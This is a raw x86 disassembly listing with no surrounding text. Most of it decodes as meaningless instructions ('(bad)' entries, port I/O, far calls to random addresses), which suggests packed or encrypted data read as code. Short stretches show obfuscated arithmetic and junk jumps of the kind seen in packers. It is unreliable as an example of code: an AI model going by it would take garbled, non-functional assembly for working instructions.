  4051c5:	push   0x58b40210
  4051ca:	icebp  
  4051cb:	push   ds
  4051cc:	mov    dl,BYTE PTR [ecx]
  4051ce:	iret   
  4051cf:	into   
  4051d0:	and    esi,DWORD PTR [esi+0x22753d4f]
  4051d6:	or     al,0x42
  4051d9:	mov    ds:0xa5365954,al
  4051de:	xlat   BYTE PTR ds:[ebx]
  4051df:	and    al,0xfb
  4051e1:	(bad)  
  4051e2:	test   BYTE PTR [eax],bl
  4051e4:	xchg   ecx,eax
  4051e5:	dec    ebp
  4051e6:	inc    ecx
  4051e7:	dec    ebp
  4051e8:	xchg   edi,eax
  4051e9:	and    BYTE PTR [edx],dh
  4051eb:	imul   ebx,DWORD PTR [edx+edx*1-0xa],0x5c
  4051f0:	add    BYTE PTR [eax-0x3],cl
  4051f3:	mov    dl,0xc0
  4051f5:	sbb    al,0x18
  4051f7:	data16 jb 0x4051d0
  4051fa:	jecxz  0x4051de
  4051fc:	fcomp  DWORD PTR [esi]
  4051fe:	pop    esp
  4051ff:	mov    bh,0x7d
  405201:	mov    bh,0xbc
  405203:	stc    
  405204:	mov    edi,0x5132b426
  405209:	jp     0x40520c
  40520b:	fwait
  40520c:	mov    bl,0xb6
  40520e:	push   ss
  40520f:	mov    ah,0x38
  405211:	push   0x17
  405213:	and    eax,0x7a5f7e2e
  405218:	push   esp
  405219:	inc    esi
  40521a:	loope  0x40520e
  40521c:	inc    eax
  40521d:	arpl   WORD PTR [ecx+ebp*4+0x7e],si
  405221:	fdivr  QWORD PTR [edx-0x40]
  405224:	mov    ah,0xb3
  405226:	shr    DWORD PTR ss:[edi+0x44bc8f10],cl
  40522d:	and    ecx,ebx
  40522f:	aad    0x2c
  405231:	imul   ecx,DWORD PTR [ecx],0xc67b45da
  405237:	aas    
  405238:	daa    
  405239:	or     bh,BYTE PTR [esi+0x1161144d]
  40523f:	shr    ecx,0xc
  405242:	xchg   esp,eax
  405243:	iret   
  405244:	pop    esi
  405245:	cwde   
  405246:	pop    ds
  405247:	or     ecx,0xffffffe0
  40524a:	test   DWORD PTR [esi+0x2b43334b],ecx
  405250:	jns    0x405244
  405252:	jb     0x4052d3
  405254:	call   0xc1cb037c
  405259:	in     al,0xdb
  40525b:	add    esi,DWORD PTR [ebp+0x7f]
  40525e:	mov    cl,0x25
  405260:	add    eax,0x25c12b0f
  405265:	add    dl,BYTE PTR [edi-0x5f7e6b6]
  40526b:	cwde   
  40526c:	sub    eax,DWORD PTR [ebx]
  40526e:	out    dx,al
  40526f:	ret    
  405270:	(bad)  
  405271:	stos   DWORD PTR es:[edi],eax
  405272:	add    eax,0x4d60c2b4
  405277:	fstp   TBYTE PTR [ecx-0x5a]
  40527a:	and    al,0xa7
  40527c:	xchg   esi,eax
  40527d:	and    al,0x89
  40527f:	sbb    eax,0xab0df3b8
  405284:	adc    cl,ch
  405286:	mov    ds:0xee007ff9,al
  40528b:	test   ebp,edi
  40528d:	lods   al,BYTE PTR ds:[esi]
  40528e:	sub    eax,0x11af5176
  405293:	jmp    0x405263
  405295:	popa   
  405296:	or     al,BYTE PTR [esi-0xe]
  405299:	jb     0x40528f
  40529b:	into   
  40529c:	sub    DWORD PTR [edi+ecx*4+0x613334b6],eax
  4052a3:	jbe    0x4052c5
  4052a5:	fwait
  4052a6:	jge    0x405252
  4052a8:	out    dx,eax
  4052a9:	inc    ebp
  4052aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ab:	adc    DWORD PTR [esi-0x35cd5ddc],0xffffff86
  4052b2:	mov    cl,0x65
  4052b4:	jmp    0x4052dd
  4052b6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052b7:	mov    dh,0x94
  4052b9:	push   ss
  4052ba:	mov    edx,0xd3fd2e5d
  4052bf:	sbb    eax,0xce694200
  4052c4:	mov    ds:0x71ec441a,al
  4052c9:	addr16 inc eax
  4052cb:	jne    0x4052f1
  4052cd:	sbb    DWORD PTR [eax+eiz*4+0x344cf589],ecx
  4052d4:	sbb    dh,0x8f
  4052d7:	fcomip st,st(5)
  4052d9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052da:	ret    
  4052db:	pop    esi
  4052dc:	jmp    0x8d3cc158
  4052e1:	addr16 hlt 
  4052e3:	pop    ss
  4052e4:	mov    ebx,0xeb26eff6
  4052e9:	test   ebx,eax
  4052eb:	aas    
  4052ec:	aad    0x2f
  4052ee:	stos   BYTE PTR es:[edi],al
  4052ef:	in     al,dx
  4052f0:	xchg   esi,eax
  4052f1:	mov    al,0x85
  4052f3:	clc    
  4052f4:	pop    ebx
  4052f5:	aad    0xbb
  4052f7:	inc    esp
  4052f8:	adc    edx,0xed7b49a6
  4052fe:	ins    DWORD PTR es:[di],dx
  405300:	dec    ebx
  405301:	pop    ds
  405302:	mov    WORD PTR ds:0x4e56c475,?
  405308:	or     ch,ch
  40530a:	xchg   edi,eax
  40530b:	sbb    eax,0x57ce406e
  405310:	sbb    eax,DWORD PTR [edx-0x327252bc]
  405316:	repnz xchg edi,eax
  405318:	lea    eax,[ecx]
  40531a:	loope  0x4052ee
  40531c:	mov    bh,0xd9
  40531e:	addr16 fs loope 0x40536e
  405322:	pop    ebp
  405323:	fcom   DWORD PTR [ecx+0x7ab8327]
  405329:	xchg   ecx,eax
  40532a:	push   es
  40532b:	inc    ebx
  40532c:	pop    es
  40532d:	cmc    
  40532e:	mov    edx,0x20f23460
  405333:	jle    0x4053b3
  405335:	les    ebp,FWORD PTR [ebx]
  405337:	push   ecx
  405338:	mov    bh,0x27
  40533a:	ret    0x9e60
  40533d:	cmp    bh,dl
  40533f:	leave  
  405340:	in     al,dx
  405341:	mov    ecx,0x742e21e2
  405346:	sti    
  405347:	pop    eax
  405348:	inc    ebp
  405349:	hlt    
  40534a:	dec    edx
  40534b:	daa    
  40534c:	jo     0x405391
  40534e:	ficomp WORD PTR [ebx]
  405350:	pusha  
  405351:	into   
  405352:	dec    ecx
  405353:	or     BYTE PTR [ecx+0x3f20980e],al
  405359:	sub    al,0x16
  40535b:	jno    0x40539b
  40535d:	das    
  40535e:	fisubr WORD PTR [edx+0x59c9aa6]
  405364:	dec    esp
  405365:	pushf  
  405366:	inc    edx
  405367:	xor    DWORD PTR [edi-0x63],ebx
  40536a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40536b:	cmp    BYTE PTR [ebp-0x6],al
  40536e:	test   BYTE PTR ds:0xae696892,cl
  405374:	int    0xe5
  405376:	fstp   DWORD PTR [ecx+0x9da045]
  40537c:	int    0xd0
  40537e:	dec    edi
  40537f:	cld    
  405380:	lea    edi,[edi+0x5c5fca21]
  405386:	mov    dh,0xc0
  405388:	push   0xffffffaf
  40538a:	xor    DWORD PTR [edi+0x10],esp
  40538d:	sbb    BYTE PTR [ebx-0x297f8a59],dl
  405393:	je     0x40537f
  405395:	and    eax,0xdf441419
  40539a:	push   edi
  40539b:	pop    eax
  40539c:	pop    ecx
  40539d:	adc    DWORD PTR [edi+edx*4],esp
  4053a0:	or     DWORD PTR [ecx+0x52cda71],edi
  4053a6:	adc    BYTE PTR [eax+0x69],ch
  4053a9:	add    esi,DWORD PTR [esi+0x7f]
  4053ac:	mov    cl,0xbf
  4053ae:	jle    0x4053b7
  4053b0:	inc    edi
  4053b1:	and    BYTE PTR [edx+0x62],al
  4053b4:	jg     0x405352
  4053b6:	mov    eax,ds:0x2a698f3b
  4053bb:	fwait
  4053bc:	jge    0x4053b9
  4053be:	push   esp
  4053bf:	pop    ds
  4053c0:	mov    dh,0x60
  4053c2:	mov    dl,0xcd
  4053c4:	xor    ah,BYTE PTR [esi]
  4053c6:	pop    es
  4053c7:	mov    WORD PTR [edi],?
  4053c9:	fcmove st,st(3)
  4053cb:	(bad)  
  4053cc:	pop    ebx
  4053cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053ce:	mov    ebp,0xb55039d5
  4053d3:	lahf   
  4053d4:	popa   
  4053d5:	addr16 jg 0x4053cc
  4053d8:	mov    ds:0xf02cbdbe,eax
  4053dd:	in     al,0x95
  4053df:	das    
  4053e0:	inc    esp
  4053e1:	out    0x99,al
  4053e3:	jns    0x405382
  4053e5:	xchg   dl,al
  4053e7:	sbb    bh,0x57
  4053ea:	xorps  xmm3,XMMWORD PTR [eax]
  4053ed:	mov    edi,0x1b1f8682
  4053f2:	ret    0x320d
  4053f5:	sahf   
  4053f6:	call   0xde0e:0xcc6ad5e1
  4053fd:	sbb    DWORD PTR [eax+0x4],edi
  405400:	pop    ebx
  405401:	call   0x88de:0xa161154c
  405408:	mov    edi,0x5d12c90
  40540d:	sbb    ebx,DWORD PTR [eax-0x435f2ff]
  405413:	jne    0x40548b
  405415:	jg     0x40545a
  405417:	(bad)  
  405419:	cwde   
  40541a:	jecxz  0x40540d
  40541c:	cmp    esp,0x49ab7594
  405422:	into   
  405423:	push   ds
  405424:	or     esi,esp
  405426:	(bad)
  405429:	aaa    
  40542a:	addr16 adc eax,0x3072f9d4
  405430:	mov    ecx,DWORD PTR ds:0xdc9874e8
  405436:	xchg   ebp,eax
  405437:	mov    esp,0x99c41218
  40543c:	daa    
  40543d:	mov    ch,0x7
  40543f:	or     dh,al
  405441:	cwde   
  405442:	sub    eax,DWORD PTR [ecx+0x3f]
  405445:	ds cmp al,dh
  405448:	jne    0x4053e4
  40544a:	imul   BYTE PTR [eax-0x4a]
  40544d:	pop    ebp
  40544e:	pop    ds
  40544f:	out    dx,al
  405450:	dec    esp
  405451:	add    esp,DWORD PTR [esi+0x6ab076ff]
  405457:	add    eax,edi
  405459:	xchg   ebx,eax
  40545a:	in     al,0xbb
  40545c:	dec    edx
  40545d:	or     BYTE PTR [esi],ah
  40545f:	fisttp DWORD PTR [ebp-0x13]
  405462:	jb     0x40549f
  405464:	cli    
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x2891fbb8]
  405484:	dec    edx
  405485:	daa    
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x4054eb
  40548f:	push   ecx
  405490:	pop    edi
  405491:	js     0x405421
  405493:	or     eax,0xd62e9575
  405498:	loope  0x40550b
  40549a:	ins    DWORD PTR es:[edi],dx
  40549b:	push   ecx
  40549c:	xchg   edx,eax
  40549d:	and    ch,dh
  40549f:	jne    0x405480
  4054a1:	sahf   
  4054a2:	ja     0x405470
  4054a4:	mov    cs,eax
  4054a6:	out    dx,eax
  4054a7:	out    0x84,al
  4054a9:	adc    bh,bl
  4054ab:	jge    0x405463
  4054ad:	ret    
  4054ae:	pop    eax
  4054af:	int    0xaf
  4054b1:	out    0x60,eax
  4054b3:	sbb    al,0xc4
  4054b5:	in     eax,0x8c
  4054b7:	pop    ebp
  4054b8:	sub    dl,cl
  4054ba:	inc    eax
  4054bb:	in     eax,dx
  4054bc:	adc    eax,0x62d0356
  4054c1:	rol    eax,1
  4054c3:	ds sub eax,0xe22a2aac
  4054c9:	fsub   QWORD PTR [edx-0x33]
  4054cc:	jl     0x405528
  4054ce:	pop    eax
  4054cf:	xor    eax,0xe74cff15
  4054d4:	xchg   ebp,eax
  4054d5:	cmp    cl,ch
  4054d7:	xor    bh,bh
  4054d9:	or     BYTE PTR [eax+ecx*4],dh
  4054dc:	and    eax,ebp
  4054de:	out    dx,al
  4054df:	mov    BYTE PTR [ebx],dl
  4054e1:	cld    
  4054e2:	add    dh,BYTE PTR [ebx]
  4054e4:	mov    ecx,0xb69dabb6
  4054e9:	sbb    BYTE PTR [eax-0x55],0x68
  4054ed:	adc    bl,BYTE PTR [ecx]
  4054ef:	push   ss
  4054f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4054f1:	montmul (bad)
  4054f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054f3:	add    al,0x24
  4054f5:	xchg   edx,eax
  4054f6:	and    DWORD PTR ds:0x90de9183,0x2c75c2a
  405500:	mov    ecx,0xdf61ccef
  405505:	ret    0x9b15
  405508:	push   ebp
  405509:	xchg   edx,eax
  40550a:	jnp    0x405508
  40550c:	aam    0x46
  40550e:	mov    bh,0x69
  405510:	mov    bl,0x68
  405512:	(bad)  
  405513:	pop    esp
  405514:	mov    ecx,DWORD PTR [eax+0x23a7af95]
  40551a:	in     al,dx
  40551b:	pusha  
  40551c:	add    ebx,ecx
  40551e:	int3   
  40551f:	jnp    0x405571
  405521:	stos   DWORD PTR es:[edi],eax
  405522:	test   bh,dl
  405524:	or     edi,DWORD PTR [ecx]
  405526:	fst    QWORD PTR [edx+0x10]
  405529:	dec    ecx
  40552a:	inc    ebx
  40552b:	pushf  
  40552c:	popa   
  40552d:	adc    eax,0xc14def29
  405532:	cmp    al,BYTE PTR [esi+eax*4-0x2f]
  405536:	cs std 
  405538:	xor    BYTE PTR [eax],0xef
  40553b:	cmp    DWORD PTR [ebp-0x41d437d8],ecx
  405541:	outs   dx,DWORD PTR ds:[esi]
  405542:	ins    DWORD PTR es:[edi],dx
  405543:	push   ds
  405544:	or     ebp,ebp
  405546:	dec    esp
  405547:	mov    ds:0x6970a519,al
  40554c:	jp     0x6989ce5b
  405552:	jnp    0x40559c
  405554:	shl    BYTE PTR ds:0x757d6c98,0x24
  40555b:	jnp    0x4055a1
  40555d:	(bad)  
  40555e:	in     eax,dx
  40555f:	cmp    bl,ah
  405561:	(bad)  
  405562:	jge    0x405538
  405564:	cmp    BYTE PTR [esp+eiz*8],dl
  405567:	xlat   BYTE PTR ds:[ebx]
  405568:	dec    edi
  405569:	nop
  40556a:	ds cli 
  40556c:	in     al,dx
  40556d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40556e:	xchg   edx,eax
  40556f:	push   esi
  405570:	shl    DWORD PTR [esi-0x52a102b8],1
  405576:	push   ss
  405577:	adc    ebp,DWORD PTR [esi-0x73]
  40557a:	gs (bad) 
  40557c:	outs   dx,DWORD PTR ds:[esi]
  40557d:	jmp    0xef74:0xc3a77432
  405584:	ror    BYTE PTR [ecx-0x9],1
  405587:	jg     0x405527
  405589:	jb     0x4055ba
  40558b:	(bad)  
  40558c:	jae    0x4055db
  40558e:	pop    ebp
  40558f:	neg    BYTE PTR [edi+0x92778e7]
  405595:	cmp    cl,BYTE PTR [ebx-0x742dc5c5]
  40559b:	repnz xor DWORD PTR [esi-0x55],edi
  40559f:	xchg   ecx,eax
  4055a0:	shr    DWORD PTR [ebx],cl
  4055a2:	sub    ch,BYTE PTR [esi]
  4055a4:	fdivr  st(3),st
  4055a6:	ror    DWORD PTR [esi],0xca
  4055a9:	jne    0x405569
  4055ab:	mov    ebp,0x4728cd73
  4055b0:	inc    ecx
  4055b1:	mov    ah,0xa
  4055b3:	push   ebp
  4055b4:	push   DWORD PTR [ecx]
  4055b6:	imul   edx,edi,0xffffff88
  4055b9:	pushf  
  4055ba:	cs push ecx
  4055bc:	test   BYTE PTR [ecx+0x693ee114],al
  4055c2:	mov    ds:0xe5115a6a,al
  4055c7:	rcr    BYTE PTR [edi+ebx*4],cl
  4055ca:	or     DWORD PTR ds:0x6befbb85,0x3c
  4055d1:	jg     0x4055a2
  4055d3:	data16 in al,0x1d
  4055d6:	push   es
  4055d7:	pushf  
  4055d8:	repnz pop esi
  4055da:	and    eax,0x65530629
  4055df:	inc    esi
  4055e0:	retf   0x8c1
  4055e3:	sahf   
  4055e4:	add    DWORD PTR [esi+0x74c7a629],ecx
  4055ea:	sbb    al,0x98
  4055ec:	mov    eax,DWORD PTR [edx+0x49]
  4055ef:	cmp    edi,0x6f9e1978
  4055f5:	scas   eax,DWORD PTR es:[edi]
  4055f6:	neg    DWORD PTR [ecx-0x74e21dd0]
  4055fc:	ja     0x405628
  4055fe:	imul   esp,ebp,0xd
  405601:	add    cl,bl
  405603:	jbe    0x40567c
  405605:	sub    BYTE PTR [ecx+0x189ece89],0x60
  40560c:	ds cwde 
  40560e:	repz aad 0x6f
  405611:	imul   edi,DWORD PTR [ebx+0x712515e4],0x4fc8b6fc
  40561b:	sub    DWORD PTR [ebx+0x7f],ebx
  40561e:	sub    eax,0xd9831dc1
  405623:	push   ds
  405624:	loop   0x405684
  405626:	adc    BYTE PTR [ebx-0x71],ch
  405629:	mov    esp,ebx
  40562b:	das    
  40562c:	addr16 inc edx
  40562e:	in     eax,0xe7
  405630:	push   0x9321be70
  405635:	inc    edi
  405636:	jg     0x4055eb
  405638:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405639:	cmp    eax,0x1768ec51
  40563e:	xor    al,0x89
  405640:	repnz cwde 
  405642:	add    al,0x15
  405644:	pusha  
  405645:	xor    DWORD PTR [ecx-0x48c76fdd],esp
  40564b:	jb     0x40566e
  40564d:	gs pop ecx
  40564f:	aas    
  405650:	push   edi
  405651:	mov    fs,ebp
  405653:	(bad)
  405656:	div    ecx
  405658:	aam    0x79
  40565a:	or     DWORD PTR [esi+ebx*2],esp
  40565d:	inc    edx
  40565e:	add    al,BYTE PTR [ebp+esi*4+0x30e97749]
  405665:	inc    ebp
  405666:	jnp    0x40562d
  405668:	fmul   QWORD PTR [ecx-0x45]
  40566b:	dec    ebx
  40566c:	push   cs
  40566d:	(bad)
  405672:	repnz dec esi
  405674:	fs mov esi,0x577cde1f
  40567a:	pop    ebx
  40567b:	jmp    0xd8a89df6
  405680:	jnp    0x4056dd
  405682:	sub    ah,BYTE PTR [eax+0x18718633]
  405688:	jae    0x4056a0
  40568a:	xor    edi,DWORD PTR [ebp-0x31]
  40568d:	push   ebx
  40568e:	call   0xcbaf:0x218f756e
  405695:	in     eax,0xb8
  405697:	jmp    0x4056fa
  405699:	push   0xe275c2ed
  40569e:	pop    ss
  40569f:	sbb    esi,DWORD PTR [ecx]
  4056a1:	mov    ebp,0xdcdd617d
  4056a6:	fmul   DWORD PTR [ebp-0x3f79ac2b]
  4056ac:	lods   eax,DWORD PTR ds:[esi]
  4056ad:	pop    ebp
  4056ae:	pusha  
  4056af:	pushf  
  4056b0:	(bad)  
  4056b1:	repnz data16 aam 0xb6
  4056b5:	xchg   edi,eax
  4056b6:	pop    edx
  4056b7:	scas   al,BYTE PTR es:[edi]
  4056b8:	sbb    cl,BYTE PTR [esi-0xf7e4278]
  4056be:	pop    edx
  4056bf:	mov    edx,0x700b794d
  4056c4:	add    BYTE PTR [eax+0x537cdf91],ah
  4056ca:	call   0xc8fd7da8
  4056cf:	dec    edx
  4056d0:	sub    eax,0x4a03eab8
  4056d5:	push   0xffffffc1
  4056d7:	mov    eax,0xd3bd2918
  4056dc:	cmp    cl,BYTE PTR [ecx]
  4056de:	aaa    
  4056df:	xor    edx,esi
  4056e1:	and    eax,DWORD PTR [edi]
  4056e3:	das    
  4056e4:	test   eax,0xb0096b31
  4056e9:	daa    
  4056ea:	push   0x684bb81d
  4056ef:	cli    
  4056f0:	or     eax,0x5f35cb2c
  4056f5:	lods   al,BYTE PTR ds:[esi]
  4056f6:	jo     0x405730
  4056f8:	add    ecx,DWORD PTR [esi+0x4e298a48]
  4056fe:	mov    ds:0x34e377a,al
  405703:	test   DWORD PTR [edi+0x4f70810e],edi
  405709:	xor    DWORD PTR [ebx],esp
  40570b:	lahf   
  40570c:	mov    esi,0xbf6d5416
  405711:	lock or esp,0xffffffe6
  405715:	push   edx
  405716:	retf   0xc99e
  405719:	sbb    eax,0xe672205a
  40571e:	mov    bh,0x9f
  405720:	das    
  405721:	lea    ecx,[esi+edi*2]
  405724:	add    al,0x17
  405726:	pop    eax
  405727:	mov    ds:0xbd68cd46,al
  40572c:	popf   
  40572d:	jne    0x4056fb
  40572f:	jnp    0x4056dc
  405731:	call   0x9ab4:0x9dec4a75
  405738:	cmp    dh,BYTE PTR [ecx+0x5a536950]
  40573e:	mov    ch,0x78
  405740:	lock sbb DWORD PTR [edi-0xa],0x345790f0
  405748:	call   0x501a224e
  40574d:	daa    
  40574e:	es (bad) 
  405750:	cmc    
  405751:	iret   
  405752:	iret   
  405753:	fld    QWORD PTR [edx]
  405755:	mov    ch,bh
  405757:	mov    ch,0x2c
  405759:	lahf   
  40575a:	pop    edi
  40575b:	pushf  
  40575c:	loope  0x40577e
  40575e:	inc    ebp
  40575f:	aam    0x8e
  405761:	or     eax,0x961dc86f
  405766:	pop    ebx
  405767:	pusha  
  405768:	jge    0x4057e9
  40576a:	int    0x9a
  40576c:	jmp    0x35573111
  405771:	push   cs
  405772:	and    al,0x50
  405774:	xor    edx,eax
  405776:	add    edx,ecx
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0x7a
  4057f5:	das    
  4057f6:	and    eax,0x7e363afe
  4057fb:	jle    0x405829
  4057fd:	jge    0x40587d
  4057ff:	jle    0x40580c
  405801:	lock (bad) gs:[edx]
  405805:	mov    ebp,0x7f28d9c2
  40580a:	add    cl,BYTE PTR [esi-0x5aa0b96a]
  405810:	and    edx,DWORD PTR [ebp+0x177cd4f3]
  405816:	scas   al,BYTE PTR es:[edi]
  405817:	es loop 0x405814
  40581a:	jp     0x405839
  40581c:	or     eax,0x5d6a711d
  405821:	loopne 0x4057de
  405823:	mov    WORD PTR [edi],ss
  405825:	icebp  
  405826:	cmp    DWORD PTR [eax],0x49698208
  40582c:	ins    DWORD PTR es:[edi],dx
  40582d:	ins    BYTE PTR es:[edi],dx
  40582e:	hlt    
  40582f:	add    DWORD PTR [edx-0x3ae577ba],0xffffffa8
  405836:	xchg   ecx,eax
  405837:	mov    esp,0xc7aa35b9
  40583c:	aas    
  40583d:	dec    eax
  40583e:	jge    0x40586c
  405840:	adc    eax,0xc78cc19f
  405845:	mov    eax,ds:0x12fc9f18
  40584a:	mov    cl,0x5e
  40584c:	stos   DWORD PTR es:[edi],eax
  40584d:	in     al,dx
  40584e:	mov    dh,BYTE PTR [ebp+0x58]
  405851:	mov    dl,0x88
  405853:	mov    eax,0x2b1cd0fd
  405858:	repz (bad) 
  40585a:	imul   eax,DWORD PTR [ecx],0xffffffb0
  40585d:	fwait
  40585e:	mov    BYTE PTR [edx-0xe],dh
  405861:	cs jmp 0x75ca6a4c
  405867:	call   0xabf279e2
  40586c:	xor    al,0x8c
  40586e:	and    BYTE PTR [esi+0x44],dl
  405871:	fcmovbe st,st(4)
  405873:	mov    eax,0x7e33a673
  405878:	ret    0x6494
  40587b:	std    
  40587c:	pop    ebx
  40587d:	sbb    esi,DWORD PTR [edx+edx*4+0x1aa84703]
  405884:	pop    es
  405885:	pushf  
  405886:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405887:	mov    ch,0x8f
  405889:	cmp    eax,0xf221066e
  40588e:	mov    eax,ds:0xa16c339c
  405893:	and    al,0x5e
  405895:	scas   eax,DWORD PTR es:[edi]
  405896:	fwait
  405897:	lds    ebx,FWORD PTR [eax-0x11]
  40589a:	imul   edi,DWORD PTR [edx],0x61
  40589d:	fsub   QWORD PTR [ebp+edi*2-0x75]
  4058a1:	inc    esp
  4058a2:	popf   
  4058a3:	add    ch,al
  4058a5:	mov    dh,0xbb
  4058a7:	imul   esi,DWORD PTR [esi+0x6e],0xffffff81
  4058ab:	test   BYTE PTR [esi-0x1f],bh
  4058ae:	data16 loop 0x405920
  4058b1:	xchg   esp,eax
  4058b2:	(bad)  
  4058b3:	pushf  
  4058b4:	xor    al,0xb9
  4058b6:	aam    0x6a
  4058b8:	mov    al,ds:0xa7a8996d
  4058bd:	push   esi
  4058be:	or     esp,DWORD PTR [esi-0xf]
  4058c1:	mov    edx,0x75ffd788
  4058c6:	and    BYTE PTR [eax+0x7a],ah
  4058c9:	in     eax,0x52
  4058cb:	xchg   ebx,eax
  4058cc:	pop    eax
  4058cd:	adc    al,bl
  4058cf:	and    BYTE PTR [esi],al
  4058d1:	pop    edx
  4058d2:	xchg   esi,eax
  4058d3:	test   bh,ah
  4058d5:	push   ebx
  4058d6:	mul    BYTE PTR [ebx+0x40]
  4058d9:	shl    DWORD PTR [esi],1
  4058db:	loopne 0x405958
  4058dd:	adc    esi,ebx
  4058df:	jge    0x4058e9
  4058e1:	xchg   edx,eax
  4058e2:	in     eax,0xf1
  4058e4:	fist   WORD PTR [ebp-0x411b5a2b]
  4058ea:	and    al,0x45
  4058ec:	xchg   esp,eax
  4058ed:	dec    ebx
  4058ee:	push   eax
  4058ef:	pop    ds
  4058f0:	test   eax,0xe87d41ac
  4058f5:	add    dh,dl
  4058f7:	jno    0x40595a
  4058f9:	leave  
  4058fa:	push   ebp
  4058fb:	stos   BYTE PTR es:[edi],al
  4058fc:	xchg   BYTE PTR fs:[esi],ah
  4058ff:	cli    
  405900:	or     edi,0xdf77a41e
  405906:	sti    
  405907:	sub    eax,0x4f4b9cfa
  40590c:	rol    BYTE PTR [ecx+0x9],0x48
  405910:	aad    0xf6
  405912:	enter  0x11fc,0xcd
  405916:	and    cl,cl
  405918:	mov    ah,0x77
  40591a:	or     BYTE PTR [ebx-0x589d5764],ch
  405920:	stos   DWORD PTR es:[edi],eax
  405921:	sbb    ch,BYTE PTR [edi]
  405923:	push   ebx
  405924:	pop    esp
  405925:	neg    BYTE PTR es:[esi+0x62ed0957]
  40592c:	inc    esi
  40592d:	(bad)  
  40592e:	cmp    ebx,eax
  405930:	repnz outs dx,DWORD PTR ds:[esi]
  405932:	inc    eax
  405933:	mov    edi,0x25623be2
  405938:	jno    0x405968
  40593a:	xor    eax,0xa630b3b2
  40593f:	out    dx,eax
  405940:	clc    
  405941:	push   0xffffff81
  405943:	xor    eax,0x45b79d9c
  405948:	popf   
  405949:	xchg   ebx,eax
  40594a:	imul   esi,edi,0x6f
  40594d:	pop    ebx
  40594e:	push   eax
  40594f:	das    
  405950:	jmp    0x40591c
  405952:	stc    
  405953:	fidiv  WORD PTR [ebx]
  405955:	fcomp  QWORD PTR [eax-0x2735aa64]
  40595b:	(bad)  
  40595c:	std    
  40595d:	enter  0xd59f,0xe9
  405961:	mov    DWORD PTR [ecx-0x489e154d],edi
  405967:	cmc    
  405968:	rcr    DWORD PTR [ecx-0x210e80eb],cl
  40596e:	js     0x405970
  405970:	fidiv  DWORD PTR [esi+0x26ac543b]
  405976:	mov    esp,0xa23360e0
  40597b:	sbb    BYTE PTR [edi-0x24],dh
  40597e:	push   ebp
  40597f:	stos   DWORD PTR es:[edi],eax
  405980:	inc    edx
  405981:	or     esp,esp
  405983:	jg     0x405920
  405985:	mov    al,0xd5
  405987:	cmc    
  405988:	xchg   BYTE PTR [ecx],ch
  40598a:	je     0x40591f
  40598c:	xor    DWORD PTR [esi+0x51],ebp
  40598f:	dec    ecx
  405990:	sbb    BYTE PTR [edi],bh
  405992:	fld    QWORD PTR [edx]
  405994:	cs ret 
  405996:	push   ebp
  405997:	cmc    
  405998:	add    eax,0x8a9b6da9
  40599d:	and    DWORD PTR [edi+0x34],esi
  4059a0:	mov    ?,eax
  4059a2:	iret   
  4059a3:	mov    eax,0xd208267d
  4059a8:	hlt    
  4059a9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4059aa:	lds    edi,FWORD PTR [ebx-0x17a4b6a3]
  4059b0:	hlt    
  4059b1:	dec    edi
  4059b2:	out    0x43,al
  4059b4:	sbb    eax,0x879b43d1
  4059b9:	pop    eax
  4059ba:	sub    BYTE PTR [ecx+0x755aba77],ch
  4059c0:	sub    al,0x6e
  4059c2:	iret   
  4059c3:	sbb    al,0x8e
  4059c5:	lock test al,0xf9
  4059c8:	cs jmp 0xe76e:0x1244c1ac
  4059d0:	add    esi,DWORD PTR [esi]
  4059d2:	inc    eax
  4059d3:	lds    ebx,FWORD PTR [ebx+0x69fd77a6]
  4059d9:	(bad)  [edi-0x3d17e76d]
  4059df:	pop    edi
  4059e0:	push   0xefa5eb5d
  4059e5:	retf   0x291c
  4059e8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
